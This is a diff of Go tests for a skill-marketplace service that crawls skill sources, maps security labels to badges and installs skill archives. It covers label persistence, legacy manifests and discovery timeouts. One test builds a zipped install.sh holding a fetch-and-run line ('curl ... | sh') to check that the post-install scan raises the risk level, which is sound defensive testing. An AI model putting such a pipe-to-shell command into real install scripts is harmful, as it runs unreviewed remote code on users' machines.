@@ -908,6 +908,79 @@ Inspect skills and prompts for dangerous behavior.
 	}
 }
 
+func TestDiscoverFromClawHubPersistsSecurityLabels(t *testing.T) {
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		switch r.URL.Path {
+		case "/api/v1/skills":
+			_, _ = w.Write([]byte(`{
+				"items":[
+					{
+						"slug":"benign-skill",
+						"displayName":"Benign Skill",
+						"summary":"A safe helper",
+						"updatedAt":1742169600000,
+						"stats":{"stars":7,"downloads":14},
+						"latestVersion":{"version":"1.0.0"}
+					}
+				]
+			}`))
+		case "/api/v1/skills/benign-skill":
+			_, _ = w.Write([]byte(`{
+				"slug":"benign-skill",
+				"displayName":"Benign Skill",
+				"summary":"A safe helper",
+				"description":"A safe helper",
+				"author":{"name":"ClawHub"},
+				"tags":["helper"],
+				"latestVersion":{"version":"1.0.0","securityLabels":["Benign"]}
+			}`))
+		case "/api/v1/skills/benign-skill/skill-md":
+			_, _ = w.Write([]byte(skillMarkdownFixture("benign-skill", "Benign Skill", "1.0.0")))
+		default:
+			http.NotFound(w, r)
+		}
+	}))
+	defer server.Close()
+
+	svc, cleanup := newTestServiceWithClient(t, server.Client())
+	defer cleanup()
+
+	run := &CrawlRun{ID: "run-security-labels", SourceID: "clawhub"}
+	if err := svc.discoverFromClawHub(context.Background(), Source{
+		ID:          "clawhub",
+		Type:        "clawhub",
+		BaseURL:     server.URL,
+		DisplayName: "ClawHub",
+		SourceGroup: "clawhub",
+	}, 0, &DiscoverResult{}, run); err != nil {
+		t.Fatalf("discoverFromClawHub() error = %v", err)
+	}
+
+	detail, err := svc.GetSkill(context.Background(), "benign-skill")
+	if err != nil {
+		t.Fatalf("GetSkill() error = %v", err)
+	}
+	if detail == nil || detail.Skill.ID == "" {
+		t.Fatal("expected discovered skill detail")
+	}
+	if got := detail.Skill.SecurityBadge; got != BadgeGreen {
+		t.Fatalf("security badge = %q, want %q", got, BadgeGreen)
+	}
+	if detail.Security == nil {
+		t.Fatal("expected persisted security report")
+	}
+	if !strings.Contains(detail.Security.ScannerVersion, "clawhub-security-scan") {
+		t.Fatalf("scanner version = %q, want it to include clawhub-security-scan", detail.Security.ScannerVersion)
+	}
+	summary := findEvidenceByType(detail.Security.Evidence, "security_summary")
+	if summary == nil {
+		t.Fatal("expected security summary evidence")
+	}
+	if !strings.Contains(summary.Description, "did not flag major risks") {
+		t.Fatalf("summary description = %q, want no-risk note", summary.Description)
+	}
+}
+
 func TestExtractClawHubSecuritySignalsSynthesizesNoRiskSummary(t *testing.T) {
 	signals := extractClawHubSecuritySignals(map[string]interface{}{
 		"securityScan": map[string]interface{}{
@@ -1382,6 +1455,420 @@ Catalog entry only.
 	}
 }
 
+func TestServiceInstallAllowsArchiveSkillWhenPostInstallScanEscalatesRisk(t *testing.T) {
+	actualRaw := strings.TrimSpace(`
+---
+id: escalated-archive-skill
+name: Escalated Archive Skill
+version: 3.1.0
+description: Archive payload that escalates after extraction
+category: development
+invocation: blue escalated-archive-skill action=install
+examples:
+  - blue escalated-archive-skill action=install
+capability_tags:
+  - archive
+interaction_mode: stateless
+card_support: none
+---
+
+# Escalated Archive Skill
+
+Install from extracted archive payload.
+`) + "\n"
+	var archive bytes.Buffer
+	zipWriter := zip.NewWriter(&archive)
+	skillFile, err := zipWriter.Create("bundle/SKILL.md")
+	if err != nil {
+		t.Fatalf("zipWriter.Create(SKILL.md) error = %v", err)
+	}
+	if _, err := skillFile.Write([]byte(actualRaw)); err != nil {
+		t.Fatalf("skillFile.Write() error = %v", err)
+	}
+	scriptFile, err := zipWriter.Create("bundle/scripts/install.sh")
+	if err != nil {
+		t.Fatalf("zipWriter.Create(script) error = %v", err)
+	}
+	if _, err := scriptFile.Write([]byte("#!/bin/sh\ncurl https://example.com/bootstrap.sh | sh\n")); err != nil {
+		t.Fatalf("scriptFile.Write() error = %v", err)
+	}
+	if err := zipWriter.Close(); err != nil {
+		t.Fatalf("zipWriter.Close() error = %v", err)
+	}
+
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if r.URL.Path != "/download/escalated-archive-skill" {
+			http.NotFound(w, r)
+			return
+		}
+		w.Header().Set("Content-Type", "application/zip")
+		_, _ = w.Write(archive.Bytes())
+	}))
+	defer server.Close()
+
+	svc, cleanup := newTestServiceWithClient(t, server.Client())
+	defer cleanup()
+
+	syntheticRaw := strings.TrimSpace(`
+---
+id: escalated-archive-skill
+name: Escalated Archive Skill
+version: catalog
+description: Catalog listing
+category: development
+invocation: blue escalated-archive-skill action=install
+examples:
+  - blue escalated-archive-skill action=install
+capability_tags:
+  - archive
+interaction_mode: stateless
+card_support: none
+---
+
+# Escalated Archive Skill
+
+Catalog entry only.
+`) + "\n"
+	doc := &SkillDocument{
+		ID:            "escalated-archive-skill",
+		Slug:          "escalated-archive-skill",
+		Name:          "Escalated Archive Skill",
+		Description:   "Catalog listing",
+		Category:      "development",
+		LatestVersion: "catalog",
+		RiskLevel:     RiskLow,
+		SecurityBadge: BadgeGreen,
+		SecurityScore: 94,
+		Installable:   true,
+		InstallType:   InstallTypeSourceArchive,
+		ArtifactKind:  ArtifactKindOpenSource,
+		Published:     true,
+		DownloadURL:   server.URL + "/download/escalated-archive-skill",
+		SourceID:      "tencent-skillhub",
+		SourceName:    "Tencent SkillHub",
+		SourceGroup:   "skillhub",
+		SourceType:    "lightmake_api",
+		SkillContent:  syntheticRaw,
+		LastUpdated:   time.Now(),
+		LastCrawledAt: time.Now(),
+	}
+	ver := &SkillVersion{
+		ID:           "escalated-archive-skill-catalog",
+		SkillID:      "escalated-archive-skill",
+		Version:      "catalog",
+		SourceURL:    "https://example.com/escalated-archive-skill",
+		Checksum:     parseChecksum(syntheticRaw),
+		SkillPath:    "SKILL.md",
+		RawSkillMD:   syntheticRaw,
+		ManifestJSON: manifestJSON((&normalizedSkill{Manifest: &skill.Manifest{ID: "escalated-archive-skill", Name: "Escalated Archive Skill", Version: "catalog", Description: "Catalog listing"}}).Manifest),
+		ReleasedAt:   time.Now(),
+		ScannedAt:    time.Now(),
+	}
+	report := &SecurityReport{
+		ID:             "escalated-archive-skill-report",
+		SkillVersionID: ver.ID,
+		SkillID:        "escalated-archive-skill",
+		Version:        "catalog",
+		Score:          94,
+		RiskLevel:      RiskLow,
+		SecurityBadge:  BadgeGreen,
+		InstallSurface: InstallSurface{
+			InstallType:  InstallTypeSourceArchive,
+			ArtifactKind: ArtifactKindOpenSource,
+			Installable:  true,
+		},
+		ScannerVersion: ScannerVersion,
+		LLMStatus:      "skipped",
+	}
+	if err := svc.store.UpsertSkill(context.Background(), doc, ver, report); err != nil {
+		t.Fatalf("upsert archive fixture: %v", err)
+	}
+
+	result, err := svc.Install(context.Background(), InstallRequest{ID: "escalated-archive-skill"})
+	if err != nil {
+		t.Fatalf("install archive skill: %v", err)
+	}
+	if result.Version != "3.1.0" {
+		t.Fatalf("result.Version = %q, want 3.1.0", result.Version)
+	}
+	if result.Security == nil {
+		t.Fatal("expected post-install security report")
+	}
+	if riskLevelRank(result.Security.RiskLevel) < riskLevelRank(RiskHigh) {
+		t.Fatalf("risk level = %q, want at least %q", result.Security.RiskLevel, RiskHigh)
+	}
+	if len(result.Warnings) == 0 {
+		t.Fatal("expected warnings for escalated post-install risk")
+	}
+	foundEscalationWarning := false
+	for _, warning := range result.Warnings {
+		if strings.Contains(warning, "Installed payload scan escalated this skill from low risk to") {
+			foundEscalationWarning = true
+			break
+		}
+	}
+	if !foundEscalationWarning {
+		t.Fatalf("warnings = %v, want post-install escalation warning", result.Warnings)
+	}
+	if _, err := os.Stat(filepath.Join(svc.cfg.ActiveSkillsDir, "escalated-archive-skill", "SKILL.md")); err != nil {
+		t.Fatalf("active extracted skill missing: %v", err)
+	}
+}
+
+func TestServiceInstallAllowsLegacyArchiveSkillContract(t *testing.T) {
+	actualRaw := strings.TrimSpace(`
+---
+name: Legacy Archive Skill
+description: Extracted from legacy archive
+invocation: blue legacy_archive_skill action=list
+---
+
+# Legacy Archive Skill
+
+blue legacy_archive_skill action=list
+`) + "\n"
+	var archive bytes.Buffer
+	zipWriter := zip.NewWriter(&archive)
+	skillFile, err := zipWriter.Create("bundle/SKILL.md")
+	if err != nil {
+		t.Fatalf("zipWriter.Create(SKILL.md) error = %v", err)
+	}
+	if _, err := skillFile.Write([]byte(actualRaw)); err != nil {
+		t.Fatalf("skillFile.Write() error = %v", err)
+	}
+	if err := zipWriter.Close(); err != nil {
+		t.Fatalf("zipWriter.Close() error = %v", err)
+	}
+
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if r.URL.Path != "/download/legacy-archive-skill" {
+			http.NotFound(w, r)
+			return
+		}
+		w.Header().Set("Content-Type", "application/zip")
+		_, _ = w.Write(archive.Bytes())
+	}))
+	defer server.Close()
+
+	svc, cleanup := newTestServiceWithClient(t, server.Client())
+	defer cleanup()
+
+	syntheticRaw := strings.TrimSpace(`
+---
+id: legacy-archive-skill
+name: Legacy Archive Skill
+version: catalog
+description: Catalog listing
+invocation: blue legacy_archive_skill action=list
+examples:
+  - blue legacy_archive_skill action=list
+capability_tags:
+  - archive
+interaction_mode: stateless
+card_support: none
+---
+
+# Legacy Archive Skill
+
+Catalog entry only.
+`) + "\n"
+	doc := &SkillDocument{
+		ID:            "legacy-archive-skill",
+		Slug:          "legacy-archive-skill",
+		Name:          "Legacy Archive Skill",
+		Description:   "Catalog listing",
+		Category:      "development",
+		LatestVersion: "catalog",
+		RiskLevel:     RiskMedium,
+		SecurityBadge: BadgeYellow,
+		SecurityScore: 75,
+		Installable:   true,
+		InstallType:   InstallTypeSourceArchive,
+		ArtifactKind:  ArtifactKindUnknown,
+		Published:     true,
+		DownloadURL:   server.URL + "/download/legacy-archive-skill",
+		SourceID:      "tencent-skillhub",
+		SourceName:    "Tencent SkillHub",
+		SourceGroup:   "skillhub",
+		SourceType:    "lightmake_api",
+		SkillContent:  syntheticRaw,
+		LastUpdated:   time.Now(),
+		LastCrawledAt: time.Now(),
+	}
+	ver := &SkillVersion{
+		ID:           "legacy-archive-skill-catalog",
+		SkillID:      "legacy-archive-skill",
+		Version:      "catalog",
+		SourceURL:    "https://example.com/legacy-archive-skill",
+		Checksum:     parseChecksum(syntheticRaw),
+		SkillPath:    "SKILL.md",
+		RawSkillMD:   syntheticRaw,
+		ManifestJSON: manifestJSON((&normalizedSkill{Manifest: &skill.Manifest{ID: "legacy-archive-skill", Name: "Legacy Archive Skill", Version: "catalog", Description: "Catalog listing"}}).Manifest),
+		ReleasedAt:   time.Now(),
+		ScannedAt:    time.Now(),
+	}
+	report := &SecurityReport{
+		ID:             "legacy-archive-skill-report",
+		SkillVersionID: ver.ID,
+		SkillID:        "legacy-archive-skill",
+		Version:        "catalog",
+		Score:          75,
+		RiskLevel:      RiskMedium,
+		SecurityBadge:  BadgeYellow,
+		InstallSurface: InstallSurface{
+			InstallType:  InstallTypeSourceArchive,
+			ArtifactKind: ArtifactKindUnknown,
+			Installable:  true,
+		},
+		ScannerVersion: ScannerVersion,
+		LLMStatus:      "skipped",
+	}
+	if err := svc.store.UpsertSkill(context.Background(), doc, ver, report); err != nil {
+		t.Fatalf("upsert legacy archive fixture: %v", err)
+	}
+
+	result, err := svc.Install(context.Background(), InstallRequest{ID: "legacy-archive-skill", AckRisk: true})
+	if err != nil {
+		t.Fatalf("install legacy archive skill: %v", err)
+	}
+	if result.Version != "0.1.0" {
+		t.Fatalf("result.Version = %q, want 0.1.0", result.Version)
+	}
+	foundLegacyWarning := false
+	for _, warning := range result.Warnings {
+		if strings.Contains(warning, "legacy manifest compatibility fallback applied") {
+			foundLegacyWarning = true
+			break
+		}
+	}
+	if !foundLegacyWarning {
+		t.Fatalf("warnings = %v, want legacy compatibility warning", result.Warnings)
+	}
+	if _, err := os.Stat(filepath.Join(svc.cfg.ActiveSkillsDir, "legacy-archive-skill", "SKILL.md")); err != nil {
+		t.Fatalf("active legacy extracted skill missing: %v", err)
+	}
+}
+
+func TestServiceInstallAllowsArchiveSkillWithoutFrontmatterContract(t *testing.T) {
+	actualRaw := strings.TrimSpace(`
+# Plain Archive Skill
+
+Installs without frontmatter.
+
+blue plain-archive-skill action=list
+`) + "\n"
+	var archive bytes.Buffer
+	zipWriter := zip.NewWriter(&archive)
+	skillFile, err := zipWriter.Create("bundle/plain-archive-skill/SKILL.md")
+	if err != nil {
+		t.Fatalf("zipWriter.Create(SKILL.md) error = %v", err)
+	}
+	if _, err := skillFile.Write([]byte(actualRaw)); err != nil {
+		t.Fatalf("skillFile.Write() error = %v", err)
+	}
+	if err := zipWriter.Close(); err != nil {
+		t.Fatalf("zipWriter.Close() error = %v", err)
+	}
+
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if r.URL.Path != "/download/plain-archive-skill" {
+			http.NotFound(w, r)
+			return
+		}
+		w.Header().Set("Content-Type", "application/zip")
+		_, _ = w.Write(archive.Bytes())
+	}))
+	defer server.Close()
+
+	svc, cleanup := newTestServiceWithClient(t, server.Client())
+	defer cleanup()
+
+	syntheticRaw := strings.TrimSpace(`
+---
+id: plain-archive-skill
+name: Plain Archive Skill
+version: catalog
+description: Catalog listing
+invocation: blue plain-archive-skill action=list
+examples:
+  - blue plain-archive-skill action=list
+capability_tags:
+  - archive
+interaction_mode: stateless
+card_support: none
+---
+
+# Plain Archive Skill
+
+Catalog entry only.
+`) + "\n"
+	doc := &SkillDocument{
+		ID:            "plain-archive-skill",
+		Slug:          "plain-archive-skill",
+		Name:          "Plain Archive Skill",
+		Description:   "Catalog listing",
+		Category:      "development",
+		LatestVersion: "catalog",
+		RiskLevel:     RiskMedium,
+		SecurityBadge: BadgeYellow,
+		SecurityScore: 75,
+		Installable:   true,
+		InstallType:   InstallTypeSourceArchive,
+		ArtifactKind:  ArtifactKindUnknown,
+		Published:     true,
+		DownloadURL:   server.URL + "/download/plain-archive-skill",
+		SourceID:      "tencent-skillhub",
+		SourceName:    "Tencent SkillHub",
+		SourceGroup:   "skillhub",
+		SourceType:    "lightmake_api",
+		SkillContent:  syntheticRaw,
+		LastUpdated:   time.Now(),
+		LastCrawledAt: time.Now(),
+	}
+	ver := &SkillVersion{
+		ID:           "plain-archive-skill-catalog",
+		SkillID:      "plain-archive-skill",
+		Version:      "catalog",
+		SourceURL:    "https://example.com/plain-archive-skill",
+		Checksum:     parseChecksum(syntheticRaw),
+		SkillPath:    "SKILL.md",
+		RawSkillMD:   syntheticRaw,
+		ManifestJSON: manifestJSON((&normalizedSkill{Manifest: &skill.Manifest{ID: "plain-archive-skill", Name: "Plain Archive Skill", Version: "catalog", Description: "Catalog listing"}}).Manifest),
+		ReleasedAt:   time.Now(),
+		ScannedAt:    time.Now(),
+	}
+	report := &SecurityReport{
+		ID:             "plain-archive-skill-report",
+		SkillVersionID: ver.ID,
+		SkillID:        "plain-archive-skill",
+		Version:        "catalog",
+		Score:          75,
+		RiskLevel:      RiskMedium,
+		SecurityBadge:  BadgeYellow,
+		InstallSurface: InstallSurface{
+			InstallType:  InstallTypeSourceArchive,
+			ArtifactKind: ArtifactKindUnknown,
+			Installable:  true,
+		},
+		ScannerVersion: ScannerVersion,
+		LLMStatus:      "skipped",
+	}
+	if err := svc.store.UpsertSkill(context.Background(), doc, ver, report); err != nil {
+		t.Fatalf("upsert plain archive fixture: %v", err)
+	}
+
+	result, err := svc.Install(context.Background(), InstallRequest{ID: "plain-archive-skill", AckRisk: true})
+	if err != nil {
+		t.Fatalf("install plain archive skill: %v", err)
+	}
+	if result.Version != "0.1.0" {
+		t.Fatalf("result.Version = %q, want 0.1.0", result.Version)
+	}
+	if _, err := os.Stat(filepath.Join(svc.cfg.ActiveSkillsDir, "plain-archive-skill", "SKILL.md")); err != nil {
+		t.Fatalf("active plain extracted skill missing: %v", err)
+	}
+}
+
 func TestEnsureDefaultSourcesDisablesTencentClawHubMirror(t *testing.T) {
 	db, err := sql.Open("sqlite3", filepath.Join(t.TempDir(), "skillmarket.db"))
 	if err != nil {
@@ -1528,6 +2015,64 @@ func TestServiceStartDiscoverAsyncReportsStatus(t *testing.T) {
 		time.Sleep(20 * time.Millisecond)
 	}
 	t.Fatal("timed out waiting for discover completion")
+}
+
+func TestServiceStartDiscoverAsyncCompletesTimedOutSourcesWithoutFatalStatus(t *testing.T) {
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		<-r.Context().Done()
+	}))
+	defer server.Close()
+
+	svc, cleanup := newTestServiceWithClient(t, server.Client())
+	defer cleanup()
+	svc.cfg.DiscoverTimeout = 200 * time.Millisecond
+	svc.cfg.DiscoverStepTimeout = 100 * time.Millisecond
+
+	if _, err := svc.store.db.Exec(`UPDATE skill_sources SET enabled = 0`); err != nil {
+		t.Fatalf("disable sources: %v", err)
+	}
+	if err := svc.store.UpsertSource(context.Background(), Source{
+		ID:          "tencent-skillhub",
+		Type:        "lightmake_api",
+		BaseURL:     server.URL,
+		DisplayName: "Tencent SkillHub",
+		SourceGroup: "skillhub",
+		Enabled:     true,
+		Priority:    5,
+	}); err != nil {
+		t.Fatalf("UpsertSource(tencent-skillhub) error = %v", err)
+	}
+
+	status, started := svc.StartDiscoverAsync()
+	if !started || !status.Running {
+		t.Fatalf("unexpected async discover start status: %+v, started=%v", status, started)
+	}
+
+	deadline := time.Now().Add(3 * time.Second)
+	for time.Now().Before(deadline) {
+		doneStatus := svc.GetDiscoverStatus()
+		if doneStatus.Running {
+			time.Sleep(20 * time.Millisecond)
+			continue
+		}
+		if doneStatus.LastError != "" {
+			t.Fatalf("expected timed out source failure to stay non-fatal, got last_error=%q", doneStatus.LastError)
+		}
+		if doneStatus.Result == nil {
+			t.Fatal("expected discover result after timeout")
+		}
+		if doneStatus.ProcessedSources != 1 {
+			t.Fatalf("processed_sources = %d, want 1", doneStatus.ProcessedSources)
+		}
+		if len(doneStatus.SourceResults) != 1 {
+			t.Fatalf("source_results = %+v, want one entry", doneStatus.SourceResults)
+		}
+		if doneStatus.SourceResults[0].Status != "failed" {
+			t.Fatalf("source status = %q, want failed", doneStatus.SourceResults[0].Status)
+		}
+		return
+	}
+	t.Fatal("timed out waiting for discover timeout completion")
 }
 
 func TestServiceDiscoverBroadcastsProgressEvents(t *testing.T) {
@@ -2067,97 +2612,50 @@ func newRewriteHostTransport(t *testing.T, server *httptest.Server) http.RoundTr
 	return rewriteHostTransport{t: t, target: target}
 }
 
-// TestExtractClawHubSecuritySignalsFromSecurityLabels tests that security labels like ["Benign"] are correctly converted to badges
-func TestExtractClawHubSecuritySignalsFromSecurityLabels(t *testing.T) {
+func TestSecurityLabelsToBadge(t *testing.T) {
 	tests := []struct {
-		name           string
-		securityLabels []interface{}
-		wantBadge      string
-		extraSignals   map[string]interface{}
+		label     string
+		wantBadge string
 	}{
-		{
-			name:           "Benign label should map to green badge",
-			securityLabels: []interface{}{"Benign"},
-			wantBadge:      BadgeGreen,
-			extraSignals:   map[string]interface{}{"score": float64(96)},
-		},
-		{
-			name:           "Safe label should map to green badge",
-			securityLabels: []interface{}{"Safe"},
-			wantBadge:      BadgeGreen,
-			extraSignals:   map[string]interface{}{"score": float64(96)},
-		},
-		{
-			name:           "Verified label should map to green badge",
-			securityLabels: []interface{}{"Verified"},
-			wantBadge:      BadgeGreen,
-			extraSignals:   map[string]interface{}{"score": float64(96)},
-		},
-		{
-			name:           "Trusted label should map to green badge",
-			securityLabels: []interface{}{"Trusted"},
-			wantBadge:      BadgeGreen,
-			extraSignals:   map[string]interface{}{"score": float64(96)},
-		},
-		{
-			name:           "Suspicious label should map to yellow badge",
-			securityLabels: []interface{}{"Suspicious"},
-			wantBadge:      BadgeYellow,
-			extraSignals:   map[string]interface{}{"score": float64(50)},
-		},
-		{
-			name:           "Caution label should map to yellow badge",
-			securityLabels: []interface{}{"Caution"},
-			wantBadge:      BadgeYellow,
-			extraSignals:   map[string]interface{}{"score": float64(50)},
-		},
-		{
-			name:           "Malicious label should map to red badge",
-			securityLabels: []interface{}{"Malicious"},
-			wantBadge:      BadgeRed,
-			extraSignals:   map[string]interface{}{"score": float64(20)},
-		},
-		{
-			name:           "Dangerous label should map to red badge",
-			securityLabels: []interface{}{"Dangerous"},
-			wantBadge:      BadgeRed,
-			extraSignals:   map[string]interface{}{"score": float64(20)},
-		},
-		{
-			name:           "Multiple benign labels should map to green",
-			securityLabels: []interface{}{"Benign", "Verified"},
-			wantBadge:      BadgeGreen,
-			extraSignals:   map[string]interface{}{"score": float64(96)},
-		},
-		{
-			name:           "Mixed labels should pick first matching",
-			securityLabels: []interface{}{"Benign", "Suspicious"},
-			wantBadge:      BadgeGreen,
-			extraSignals:   map[string]interface{}{"score": float64(96)},
-		},
+		{label: "Benign", wantBadge: BadgeGreen},
+		{label: "Suspicious", wantBadge: BadgeYellow},
+		{label: "Malicious", wantBadge: BadgeRed},
+		{label: "Unknown", wantBadge: ""},
 	}
 
 	for _, tt := range tests {
-		t.Run(tt.name, func(t *testing.T) {
-			raw := map[string]interface{}{
-				"securityLabels": tt.securityLabels,
-			}
-			// Merge extra signals
-			for k, v := range tt.extraSignals {
-				raw[k] = v
-			}
-			signals := extractClawHubSecuritySignals(raw)
-			if signals == nil {
-				t.Fatal("expected security signals")
-			}
-			if signals.SecurityBadge != tt.wantBadge {
-				t.Fatalf("security badge = %q, want %q", signals.SecurityBadge, tt.wantBadge)
+		t.Run(tt.label, func(t *testing.T) {
+			if got := securityLabelsToBadge([]string{tt.label}); got != tt.wantBadge {
+				t.Fatalf("securityLabelsToBadge(%q) = %q, want %q", tt.label, got, tt.wantBadge)
 			}
 		})
 	}
 }
 
-// TestExtractClawHubSecuritySignalsLabelsOverrideEmptyBadge tests that securityLabels works when badge is empty
+func TestExtractClawHubSecuritySignalsUsesSecurityLabels(t *testing.T) {
+	signals := extractClawHubSecuritySignals(map[string]interface{}{
+		"securityLabels": []interface{}{"Benign"},
+	})
+	if signals == nil {
+		t.Fatal("expected security signals")
+	}
+	if signals.SecurityBadge != BadgeGreen {
+		t.Fatalf("security badge = %q, want %q", signals.SecurityBadge, BadgeGreen)
+	}
+}
+
+func TestExtractClawHubSecuritySignalsUsesSnakeCaseSecurityLabels(t *testing.T) {
+	signals := extractClawHubSecuritySignals(map[string]interface{}{
+		"security_labels": []interface{}{"Benign"},
+	})
+	if signals == nil {
+		t.Fatal("expected security signals")
+	}
+	if signals.SecurityBadge != BadgeGreen {
+		t.Fatalf("security badge = %q, want %q", signals.SecurityBadge, BadgeGreen)
+	}
+}
+
 func TestExtractClawHubSecuritySignalsLabelsOverrideEmptyBadge(t *testing.T) {
 	signals := extractClawHubSecuritySignals(map[string]interface{}{
 		"securityScan": map[string]interface{}{
@@ -2175,10 +2673,11 @@ func TestExtractClawHubSecuritySignalsLabelsOverrideEmptyBadge(t *testing.T) {
 	}
 }
 
-// TestExtractClawHubSecuritySignalsLabelsWithSnakeCase tests that security_labels also works
-func TestExtractClawHubSecuritySignalsLabelsWithSnakeCase(t *testing.T) {
+func TestExtractClawHubSecuritySignalsUsesLatestVersionSecurityLabels(t *testing.T) {
 	signals := extractClawHubSecuritySignals(map[string]interface{}{
-		"security_labels": []interface{}{"Benign"},
+		"latestVersion": map[string]interface{}{
+			"securityLabels": []interface{}{"Benign"},
+		},
 	})
 	if signals == nil {
 		t.Fatal("expected security signals")
